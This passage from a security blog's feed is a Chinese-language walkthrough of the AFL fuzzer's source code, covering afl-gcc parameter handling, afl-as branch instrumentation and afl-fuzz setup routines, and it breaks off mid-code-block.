href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://macoshome.com/hackintosh/hcourse/8672.html">https://macoshome.com/hackintosh/hcourse/8672.html</a></p><p><a href="https://www.wch.cn/downloads/CH341SER_EXE.html">https://www.wch.cn/downloads/CH341SER_EXE.html</a></p><p><a href="https://www.bilibili.com/video/BV1MU4y1d78x/?vd_source=24a2b4fd0cbfe31385800372c26e55ce">https://www.bilibili.com/video/BV1MU4y1d78x/?vd_source=24a2b4fd0cbfe31385800372c26e55ce</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;CH341A编程器在线固件提取&quot;&gt;&lt;a href=&quot;#CH341A编程器在线固件提取&quot; class=&quot;headerlink&quot; title=&quot;CH341A编程器在线固件提取&quot;&gt;&lt;/a&gt;CH341A编程器在线固件提取&lt;</summary>
      
    
    
    
    <category term="固件提取" scheme="https://www.z1r0.top/categories/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>AFL_fuzz源码分析</title>
    <link href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2023-03-23T13:31:33.000Z</published>
    <updated>2023-08-17T06:28:19.669Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="AFL-fuzz源码分析"><a href="#AFL-fuzz源码分析" class="headerlink" title="AFL_fuzz源码分析"></a>AFL_fuzz源码分析</h1><blockquote><p>自己动手调试并在此记录了一下，在学习的过程中参考了sakura大佬的文章</p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p></blockquote><h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><p>程序调试的参数是：<code>/usr/local/bin/afl-gcc /path/test.c -o /path/test</code> ，先从主函数开始看第一部分</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">"AFL_QUIET"</span>)) {</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">"afl-cc "</span> cBRI VERSION cRST <span class="string">" by &lt;lcamtuf@google.com&gt;\n"</span>);</span><br><span class="line"></span><br><span class="line">  } <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) {</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">"\n"</span></span><br><span class="line">         <span class="string">"This is a helper application for afl-fuzz. It serves as a drop-in replacement\n"</span></span><br><span class="line">         <span class="string">"for gcc or clang, letting you recompile third-party code with the required\n"</span></span><br><span class="line">         <span class="string">"runtime instrumentation. A common use pattern would be one of the following:\n\n"</span></span><br><span class="line"></span><br><span class="line">         <span class="string">"  CC=%s/afl-gcc ./configure\n"</span></span><br><span class="line">         <span class="string">"  CXX=%s/afl-g++ ./configure\n\n"</span></span><br><span class="line"></span><br><span class="line">         <span class="string">"You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n"</span></span><br><span class="line">         <span class="string">"Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n"</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>如果没有设置<code>AFL_QUIET</code>这个环境变量，在屏幕上显示信息，argc是4，所以并不会退出，继续</p><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><blockquote><p>接下来是find_as函数，这个函数用来寻找<code>afl-as</code>的位置</p></blockquote><p>首先会检查是否存在<code>AFL_PATH</code>这个环境变量，如果存在就给<code>afl_path</code>并且<code>afl_path/as</code>可以访问的话，则将<code>afl_path</code>给到<code>as_path</code></p><p>如果没有<code>afl_path</code>，检查argv0是否存在/，然后找到最后的/这个位置，并将最后的/+后面的东西赋值给slash，也就是上面的<code>/usr/local/bin/afl-gcc</code>，最后<code>slash = /afl-gcc</code>，然后会把前面的<code>/usr/local/bin</code>赋值给dir，然后检查<code>dir/afl-as</code>是否可以访问，如果可以访问，则<code>as_path = dir</code></p><p>再下面会检查<code>AFL_PATH/as</code>可不可以访问，如果可以访问则<code>as_path = AFL_PATH</code>，这里应该是没有意义的，因为一开始就会检查是否存在<code>AFL_PATH</code>这个环境变量，但是笔者在调试的时候发现第一步检查环境变量是NULL，重要的是最后一个检查<code>AFL_PATH/as</code>可不可以访问竟然有值了，是<code>/usr/local/lib/afl</code>，最终<code>as_path = /usr/local/lib/afl</code></p><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><blockquote><p>处理afl-gcc后面的参数，处理后放入cc_params[]数组</p></blockquote><p>首先会给cc_params开一个内存空间，空间大小是<code>(argc + 128) * sizeof(u8*)</code>，在这个例子中argc是4</p><p>检查第一个参数也就是<code>/usr/local/bin/afl-gcc</code>这里有没有/，如果有则<code>name = afl-gcc</code>，如果没有那name就直接等于第一个参数</p><p>接着会判断是否是<code>afl-clang</code></p><ul><li><p>如果是则设置<code>clang_name=1</code>，环境变量<code>CLANG_ENV_VAR</code>设置为1</p><ul><li>又继续和<code>afl-clang++</code>比较，如果相等并且<code>AFL_CXX</code>环境变量存在，把<code>cc_params[0]</code>设置成这个环境变量的值，如果不存在则设置成clang++</li><li>如果不是<code>afl-clang++</code>，并且<code>AFL_CC</code>环境变量存在，把<code>cc_params[0]</code>设置成这个环境变量的值，如果不存在则设置成clang</li></ul></li><li><p>如果不是<code>afl-clang</code>，则判断是否是<code>afl-g++</code></p><ul><li>是<code>afl-g++</code>的话，并且<code>AFL_CXX</code>环境变量存在，把<code>cc_params[0]</code>设置成这个环境变量的值，如果不存在则设置成g++</li><li>是<code>afl-gcj</code>的话，并且<code>AFL_GCJ</code>环境变量存在，把<code>cc_params[0]</code>设置成这个环境变量的值，如果不存在则设置成gcj</li><li>是其他的话，并且<code>AFL_CC</code>环境变量存在，把<code>cc_params[0]</code>设置成这个环境变量的值，如果不存在则设置成gcc</li></ul></li></ul><p>在这个例子里<code>cc_params[0]</code>就等于<code>gcc</code>，中间还有一个<code>#ifdef __APPLE__</code>，这个意思是苹果平台需要进行的操作，这里是在linux下的，所以不需要太关注</p><p>接着会从argv[1]开始遍历，跳过<code>-B/integrated-as/-pipe</code>，如果有<code>-fsanitize=address</code>和<code>-fsanitize=memory</code>这个参数，则设置<code>asan_set = 1</code>，如果有<code>FORTIFY_SOURCE</code>，则<code>fortify_set = 1</code>，把参数都依次保存在ccparams这里<code>cc_params[cc_par_cnt++] = cur</code></p><p>在后面会加上<code>-B as_path</code>这两个参数，判断是否是clang_mode，如果是则再加<code>-no-integrated-as</code>这个参数，如果存在<code>AFL_HARDEN</code>环境变量，则参数加上<code>-fstack-protector-all</code>，在环境变量存在的前提下如果<code>fortify_set = 1</code>，则再加上<code>-D_FORTIFY_SOURCE=2</code></p><p>如果<code>asan_set</code>被设置了，则设置<code>AFL_USE_ASAN</code>这个环境变量为1，在<code>asan_set</code>没有被设置的前提下，如果设置了<code>AFL_USE_ASAN</code>，则不能再同时指定<code>AFL_USE_MASN, AFL_HARDEN</code>这两个，设置<code>-U_FORTIFY_SOURCE,-fsanitize=memory</code>，如果前面都没设置，则看是否设置了<code>AFL_USE_MASN</code>，和第二个差不多</p><p>如果不存在<code>AFL_DONT_OPTIMIZE</code>这个环境变量则设置<code>-g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code>，如果存在<code>AFL_NO_BUILTIN</code>这个变量，则设置<code>-fno-builtin-strcmp/-fno-builtin-strncmp</code>等</p><p>最终结尾给一个NULL结束</p><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cc_params); ++i){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"id[%d] = %s\n"</span>, i, cc_params[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">"Oops, failed to execute '%s' - check your PATH"</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最后会通过execvp来执行命令，最终的命令可以借助printf打印出来看一下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id[<span class="number">0</span>] = gcc</span><br><span class="line">id[<span class="number">1</span>] = /home/z1r0/fuzz_test/test.c</span><br><span class="line">id[<span class="number">2</span>] = -o</span><br><span class="line">id[<span class="number">3</span>] = /home/z1r0/fuzz_test/test</span><br><span class="line">id[<span class="number">4</span>] = -B</span><br><span class="line">id[<span class="number">5</span>] = /usr/local/lib/afl</span><br><span class="line">id[<span class="number">6</span>] = -g</span><br><span class="line">id[<span class="number">7</span>] = -O3</span><br></pre></td></tr></tbody></table></figure><p>会把<code>/usr/local/lib/afl</code>加到编译器的搜索路径，在这个例子里实际会调用<code>afl-as</code>来作为汇编器</p><h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><p>从上面得到最终会调用as这个东西来进行插桩，对其进行调试，在调试之前打印一下参数，然后调试的时候传入参数即可</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(pid = fork())) {</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(as_params); ++i){</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"as[%d] = %s\n"</span>, i, as_params[i]);</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    FATAL(<span class="string">"Oops, failed to execute '%s' - check your PATH"</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">as[<span class="number">0</span>] = as</span><br><span class="line">as[<span class="number">1</span>] = -<span class="number">-64</span></span><br><span class="line">as[<span class="number">2</span>] = -o</span><br><span class="line">as[<span class="number">3</span>] = /tmp/ccuXPXsJ.o</span><br><span class="line">as[<span class="number">4</span>] = /tmp/.afl<span class="number">-3164329</span><span class="number">-1677932048.</span>s</span><br><span class="line">as[<span class="number">5</span>] = (null)</span><br><span class="line">as[<span class="number">6</span>] = (null)</span><br><span class="line">as[<span class="number">7</span>] = (null)</span><br></pre></td></tr></tbody></table></figure><p>主函数前面的逻辑和afl-gcc都差不多，会获取<code>AFL_INST_RATIO</code>这个环境变量的值，设置为<code>inst_ratio_str</code>，<code>gettimeofday</code>这个是获取时间，然后设置随机数种子<code>rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</code>，接着把参数传入<code>edit_params</code>函数</p><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><blockquote><p>给<code>tmp_dir</code>赋值，获得<code>AFL_AS</code>环境变量如果存在则设置<code>afl_as</code>的值，还会对apple平台进行额外的设置</p></blockquote><ul><li>先判断<code>TMPDIR/TEMP/TMP</code>这三个环境变量是否有值，如果哪个有值则把那个值给到tmp_dir</li><li>如果都没有则tmp_dir为/tmp</li></ul><p>给as_params开一个空间，空间大小是<code>(argc + 32) * sizeof(u8*)</code></p><p>如果<code>afl_as</code>为空则<code>as_params[0] = as</code>，否则<code>as_params[0] = afl_as</code>，<code>as_params[argc] = 0</code></p><p>遍历传入的参数，如果有–64则<code>use_64bit = 1</code>，如果有<code>--32则use_64bit = 0</code>，还会对apple平台进行判断，如果是<code>-arch x86_64</code>，则<code>use_64bit = 1</code>，并且会跳过-q和-Q，如果是32的话就不支持</p><p><code>as_params[as_par_cnt++] = argv[i]</code>把参数都一一放到<code>as_params</code>这里，apple平台的话进行额外的设置</p><p>把最后一个参数传给<code>input_file</code></p><ul><li><p>如果<code>input_file</code>的首字符是-</p><ul><li>后面是-version的话，<code>just_version = 1</code>，<code>modified_file = input_file</code></li><li>如果不是-version的话，则报错</li><li>如果后面没有的话则<code>input_file=NULL</code></li></ul></li><li><p>如果首字符不是-</p><ul><li>比较<code>tmp_dir</code>、<code>/var/tmp</code>、<code>/tmp/</code>，的前<code>strlen(tmp_dir)/9/5</code>个字节是否相等，不相等就设置<code>pass_thru=1</code></li></ul></li></ul><p>设置<code>modified_file</code>为<code>tmp_dir/.afl-getpid()-time(NULL).s</code></p><p>设置<code>as_params[as_par_cnt++] = modified_file;</code>和<code>as_params[as_par_cnt]   = NULL;</code></p><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><blockquote><p>插桩函数</p></blockquote><p>如果<code>input_file</code>不为空，利用fopen打开这个文件，如果为空则<code>inf = stdin</code>，最终都会给到<code>inf</code>这个FILE*指针</p><p>打开<code>modified_file</code>获取outfd，再通过outfd利用fdopen得到outf这个FILE*指针</p><p>通过fgets把inf里的内容读取到line这个数组中，每行最多读取<code>MAX_LINE</code>也就是8192</p><ul><li><p>判断<code>instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == '\t' &amp;&amp; isalpha(line[1])</code>，<code>instr_ok和instrument_next</code>是否都为1，<code>line</code>是否是<code>\t</code>，<code>line[1]</code>是否是字母</p><ul><li>如果都满足，向outf中写入对应的<code>trampoline_fmt</code>，设置<code>instrument_next = 0</code>，插桩计数器<code>ins_lines++</code></li><li>这些都是想要插入instrumentation trampoline到所有的标签，宏，注释之后</li></ul></li><li><p>instr_ok为1的话就代表在.text部分，如果是0的话就代表不在，如果在的话就会执行插桩逻辑，不在就不执行插桩逻辑</p><ul><li>line为<code>\t.text\n, \t.section\t.text, \t.section\t__TEXT,__text, \t.section __TEXT, __text</code>之中的一个，设置instr_ok为1，然后continue，回到while继续从inf读数据到line这个数组中</li><li>line为<code>\t.section\t, \t.section, \t.bss\n, \t.data\n</code>之中的一个，设置instr_ok = 0，然后continue，回到while继续从inf读数据到line这个数组中</li><li>如果<code>clang_mode = 0, instr_ok = 1</code>，并且line为<code>\t.p2align</code>，则<code>skip_next_label = 1</code></li></ul></li><li><p>判断一些信息，是att汇编还是intel汇编，是32位还是64位，接着设置相应的flag</p></li><li><p>插桩<code>^\tjnz foo</code>条件跳转指令，插桩重点是<code>^main ^.L0 ^.LBB0_0 ^\tjnz foo</code></p><ul><li>如果line的值是<code>\tj[!m].</code>，并且<code>R(100) &lt; inst_ratio</code>，<code>R(100)</code>是一个100以内的随机数，inst_ratio默认是100，则会进行插桩，如果<code>inst_ratio</code>设置为0就代表不会对该分支进行插桩，<code>R()</code>这个相当于是区分每个桩的，看成一个flag</li><li>判断是否对应的位数然后向outf里写入<code>trampoline_fmt_64</code>或者<code>trampoline_fmt_32</code></li></ul></li><li><p><code>ins_lines</code>插桩计数器+1</p></li><li><p>检查line是否有<code>:</code>，然后检查第一个是不是<code>.</code></p><ul><li><p>如果第一个是<code>.</code>，则就是想插桩<code>^.L0:</code>或者<code>^.LBB0_0</code>这样的branch label，即style jump destination</p><ul><li>检查<code>line[2]</code>是否是数字，或者在<code>clang_mode</code>下比较<code>line[1]</code>开始的3个字节是否是<code>LBB</code></li><li>上面的结果和<code>R(100) &lt; inst_ratio</code>相与<ul><li>如果满足条件，并且<code>skip_next_label</code>不为0，则<code>instrument_next</code>为1，反之为0</li></ul></li></ul></li><li><p>否则是一个function，插桩<code>^func</code>，把<code>instrument_next</code>设置成1</p></li></ul></li><li><p>上面执行完之后满足第一个条件，那就真正的插桩了</p></li></ul><p>如果插桩计数器不为0，那么就在上面操作之后把对应的<code>main_payload</code>写入outf，然后关闭这两个文件</p><p>上面就是afl-as的主要逻辑，afl的插桩相当简单粗暴，就是通过汇编的前导命令来判断这是否是一个分支或者函数，然后插入instrumentation trampoline</p><p>最后就是afl-as的main结尾，fork出一个子进程，让子进程来执行<code>execvp(as_params[0], (char **) as_params);</code>，如果没有设置环境变量<code>AFL_KEEP_ASSEMBLY</code>的值，就unlink掉modified_file</p><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><p><code>gettimeofday</code>获取时间，然后设置随机数种子<code>rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</code>这个和afl-as前面一样</p><h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h4><blockquote><p>注册必要的信号处理函数</p></blockquote><ul><li>SIGHUP，由一个处于非连接状态的终端发送给控制进程，或者由控制进程在自身结束时发送给每个前台进程</li><li>SIGINT，一般由从终端敲入的Crl+C组合键或预先设置好的中断字符产生</li><li>SIGTERM，作为一个请求被发送，要求进程结束运行。UNIX在关机时用这个信号要求系统服务停止运行。它是kill命今默认发送的信号</li><li>SIGALRM，由alarm函数设置的定时器产生</li><li>SIGWINCH，处理窗口大小的变化信号</li><li>SIGPIPE，如果在向管道写数据时没有与之对应的读进程，就会产生这个信号</li><li>SIGUSR1，进程之问可以用这个信号进行通信，例如让进程报告状态信息等</li></ul><h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><p>读取<code>ASAN_OPTIONS</code>和<code>MSAN_OPTIONS</code>，进行一些检查</p><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><p>如果通过-M或者-S指定了sync_id，设置sync_dir值为<code>out_dir</code>，设置out_dir的值为<code>out_dir/sync_id</code></p><h4 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h4><p>将当前输入参数拷贝进buf空间中</p><h4 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h4><blockquote><p>如果没有设置<code>use_banner</code></p></blockquote><ul><li>如果设置了sync_id，则<code>use_banner = sync_id</code></li><li>如果没有设置sync_id，trim为最后一个包含/的参数的后面部分（/目标测试文件）<ul><li>如果trim存在，则<code>use_banner = trime + 1</code>就是目标测试文件，否则<code>use_banner = name</code></li></ul></li></ul><p>如果use_banner长度大于40则只保留40个长度</p><h4 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h4><p>检查是否在tty终端上运行，如果不是tty的话<code>not_on_tty=1</code></p><h4 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h4><p>这个其实就是获取cpu的核心数量</p><h4 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h4><p>检查是否有空闲的核心了，如果有的话就绑定到空闲cpu</p><h4 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h4><p>确保核心转储不会进入程序</p><h4 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h4><p>检查CPU调节器</p><h4 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h4><p>如果没有设置<code>AFL_POST_LIBRARY</code>这个环境变量则直接返回，设置了这个变量会加载<code>afl_postprocess</code>函数</p><h4 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h4><p>如果<code>in_bitmap</code>为空，则通过memset初始化virgin_bits数组里的每个元素为<code>255(\xff)</code></p><p>通过memset初始化<code>virgin_tmout和virgin_crash</code>数组里的每个元素为<code>255(\xff)</code></p><p>shmget分配了一个共享内存，将返回的共享内存标识符保存到shm_id里</p><ul><li><code>shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); </code></li><li>一参与信号量的semget函数一样，程序需要提供一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1</li><li><code>IPC_PRIVATE</code>为0所以创建一块新的共享内存，大小是MAP_SIZE</li><li>第三个参数它的作用与open函数的mode参数一样<ul><li><code>IPC_CREAT</code>如果共享内存不存在，则创建一个共享内存，否则打开操作</li><li><code>IPC_EXC</code>L只有在共享内存不存在的时候，新的共享内存才创建，否则产生错误</li><li><code>0600</code>代表拥有者具有读写权限</li></ul></li></ul><p>注册程序正常终止时调用<code>remove_shm</code>函数</p><ul><li><code>shmctl(shm_id, IPC_RMID, NULL);</code>用来控制共享内存<ul><li>第一个参数，shm_id是shmget()函数返回的共享内存标识符</li><li>第二个参数，command是要采取的操作，它可以取下面的三个值 ：<ul><li><code>IPC_STAT</code>：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值</li><li><code>IPC_SET</code>：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值</li><li><code>IPC_RMID</code>：删除共享内存段</li></ul></li><li>所以第二个参数意思就是删除共享内存段</li><li>第三个参数，buf是一个结构指针，它指向共享内存模式和访问权限的结构</li></ul></li></ul><p>创建shm_str，这个里面存放的还是shm_id</p><p>如果不是dumb_mode，则设置环境变量<code>SHM_ENV_VAR</code>的值为shm_str</p><p>释放shm_str指针，并<code>trace_bits = shmat(shm_id, NULL, 0);  </code></p><ul><li><code>shmat(shm_id, NULL, 0);</code><ul><li>第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间</li><li>第一个参数，shm_id是由shmget()函数返回的共享内存标识</li><li>第二个参数，指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址</li><li>第三个参数，shm_flg是一组标志位，通常为0</li><li>调用成功时返回一个指向共享内存第一个字节的指针，失败返回-1</li></ul></li></ul><p>trace_bits指向共享内存第一个字节的指针，如果失败则报错</p><h4 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h4><blockquote><p>这个用来初始化<code>count_class_lookup16</code>数组，将<code>count_class_lookup16</code>数组分成256段，每段256份</p></blockquote><ul><li><p><code>count_class_lookup8</code>，把这个路径命中数进行规整</p><ul><li>执行了4-7次的其计数为8，比如32次到127次都会认为是64</li><li>变量 <code>trace_bits</code> 来记录分支执行次数，而count_class_lookup8实际就是对于<code>trace_bits</code>的规整。</li></ul></li><li><p>而初始化<code>count_class_lookup16</code>实际是因为 AFL 中对于一条分支径的表示是由一个二元组来表示的</p><ul><li>比如A-&gt;B-&gt;C-&gt;D，可用<code>[A, B], [B, C], [C, D]</code>来表示，基于效率考虑，使用了<code>count_class_lookup16</code>这个数组</li></ul></li></ul><h4 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h4><blockquote><p>准备输出文件夹和fd</p></blockquote><p>如果sync_id存在，并且创建sync_dir文件夹，权限是0700，并且<code>errno != EEXIST</code>则异常</p><p>创建out_dir文件夹，权限是0700，创建成功返回0，创建错误返回-1，并且错误保存在errno中</p><ul><li>创建失败<ul><li>如果errno不是EEXIST则异常<ul><li>maybe_delete_out_dir，这个函数会删除out_dir里面的旧东西</li></ul></li></ul></li><li>创建成功<ul><li>如果设置了<code>in_place_resume</code>则异常</li><li>以只读打开<code>out_dir</code>，返回文件句柄到<code>out_dir_fd</code></li><li>如果没有定义宏<code>__sun</code><ul><li>打开失败或者通过flock建立互斥锁定失败，异常</li></ul></li></ul></li></ul><p>创建<code>out_dir/queue</code>文件夹，权限为0700</p><ul><li>创建<code>out_dir/queue/.state/</code>，设置权限为0700，该文件夹主要<strong>保存用于session resume和related tasks的queue metadata</strong><ul><li>创建<code>out_dir/queue/.state/deterministic_done/</code>，设置权限为0700，该文件夹<strong>标记过去经历过deterministic fuzzing的queue entries</strong></li><li>创建<code>out_dir/queue/.state/auto_extras/</code>，设置权限为0700，<strong>Directory with the auto-selected dictionary entries</strong></li><li>创建<code>out_dir/queue/.state/redundant_edges/</code>，设置权限为0700，<strong>保存当前被认为是多余的路径集合</strong></li><li>创建<code>out_dir/queue/.state/variable_behavior/</code>，设置权限为0700，<strong>The set of paths showing variable behavior</strong></li></ul></li></ul><p>如果sync_id存在</p><ul><li>创建<code>out_dir/.synced</code>文件夹</li></ul><p>创建<code>out_dir/crashes</code>文件夹，用于记录crashes</p><p>创建<code>out_dir/hangs</code>文件夹，用于记录hangs</p><p>以读写模式打开<code>/dev/null</code>，以只读的模式打开<code>/dev/urandom</code></p><p>以只写方式打开<code>out_dir/plot_data</code>文件，如果没有则创建一个，获取句柄，根据句柄得到<code>FILE* plot_file</code>，并向里写入<code># unix_time, cycles_done, cur_path, paths_total, pending_total, pending_favs, map_size, unique_crashes, unique_hangs, max_depth, execs_per_sec</code></p><h4 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h4><blockquote><p>从输入文件夹中读取所有文件，然后将它们排队进行测试</p></blockquote><p>判断<code>in_dir/queue</code>文件是否存在，成功0，失败-1</p><ul><li>如果存在这个文件，<code>in_dir = fn = in_dir/queue</code></li><li>不存在则释放fn</li></ul><p>扫描in_dir，并将结果保存在<code>struct dirent **nl</code>里（. ..也会被算进去），不使用readdir，因为测试用例的顺序将随机地有些变化，并且将难以控制</p><p>如果<code>shuffle_queue</code>的值为真，且nl_cnt大于1，则<code>shuffle_ptrs((void **) nl, nl_cnt)</code>，重排nl里的指针的位置</p><p>遍历nl</p><ul><li><p><code>u8* fn = alloc_printf("%s/%s", in_dir, nl[i]-&gt;d_name);</code>，<code>fn = in_dir/nl[i]-&gt;d_name</code>，<code>nl[i]-&gt;d_name</code>的值为input文件夹下的文件名字符串</p></li><li><p><code>u8 *dfn = alloc_printf("%s/.state/deterministic_done/%s", in_dir, nl[i]-&gt;d_name);</code></p></li><li><p>通过文件属性过滤掉<code>.</code>和<code>..</code>这样的regular文件，并检查文件大小，如果文件大小大于MAX_FILE则异常，默认是1024*1024字节，即1M</p></li><li><p>通过access检查<code>in_dir/.state/deterministic_done/nl[i]-&gt;d_name</code>是否存在，这应该是为了用在resume恢复扫描使用</p><ul><li>如果存在则设置<code>passwd_det = 1</code></li><li>此检查用来判断是否这个入口已经完成deterministic fuzzing。在恢复异常终止的扫描时不想重复进行deterministic fuzzing</li></ul></li><li><p><code>add_to_queue(fn, st.st_size, passed_det);</code></p></li><li><p>如果queued_paths为0，则代表输入文件夹为0，抛出异常</p></li><li><p>设置last_path_time为0</p></li><li><p>queued_at_start的值设置为queued_paths</p></li></ul><h4 id="add-to-queue"><a href="#add-to-queue" class="headerlink" title="add_to_queue"></a>add_to_queue</h4><p>queue_entry是一个链表数据结构，先通过calloc动态分配一个queue_entry结构体，并初始化其fname为文件名fn，len为文件大小，depth为cur_depth + 1，passed_det为传递进来的passed_det，具体代码如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 